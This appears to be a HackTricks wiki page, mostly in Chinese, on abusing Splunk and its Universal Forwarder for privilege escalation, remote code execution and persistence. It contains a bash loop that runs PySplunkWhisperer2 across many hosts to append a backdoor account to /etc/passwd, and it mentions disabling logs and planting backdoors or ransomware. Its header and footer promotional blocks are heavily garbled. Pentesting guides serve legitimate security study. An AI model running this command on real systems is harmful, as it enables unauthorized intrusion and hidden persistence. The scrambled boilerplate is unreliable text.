# Splunk LPE and Persistence

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

如果在**内部**或**外部**枚举一台机器时发现**Splunk正在运行**（端口8090），如果你幸运地知道任何**有效凭据**，你可以**利用Splunk服务**来**以运行Splunk的用户身份执行shell**。如果是root在运行它，你可以提升权限到root。

此外，如果你已经是root并且Splunk服务不仅在localhost上监听，你可以**从**Splunk服务中**窃取**密码文件并**破解**密码，或者**添加新的**凭据到其中。并在主机上保持持久性。

在下面的第一张图片中，你可以看到Splunkd网页的样子。



## Splunk Universal Forwarder Agent Exploit Summary

有关更多详细信息，请查看帖子 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。这只是一个总结：

**Exploit Overview:**
针对Splunk Universal Forwarder Agent (UF) 的漏洞允许拥有代理密码的攻击者在运行该代理的系统上执行任意代码，可能会危及整个网络。

**Key Points:**
- UF代理不验证传入连接或代码的真实性，使其容易受到未经授权的代码执行攻击。
- 常见的密码获取方法包括在网络目录、文件共享或内部文档中查找。
- 成功利用可能导致在受损主机上获得SYSTEM或root级别的访问权限、数据外泄和进一步的网络渗透。

**Exploit Execution:**
1. 攻击者获得UF代理密码。
2. 利用Splunk API向代理发送命令或脚本。
3. 可能的操作包括文件提取、用户账户操作和系统妥协。

**Impact:**
- 在每个主机上完全控制网络，拥有SYSTEM/root级别的权限。
- 可能禁用日志记录以逃避检测。
- 安装后门或勒索软件。

**Example Command for Exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公共漏洞：**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## 滥用 Splunk 查询

**有关更多详细信息，请查看帖子 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
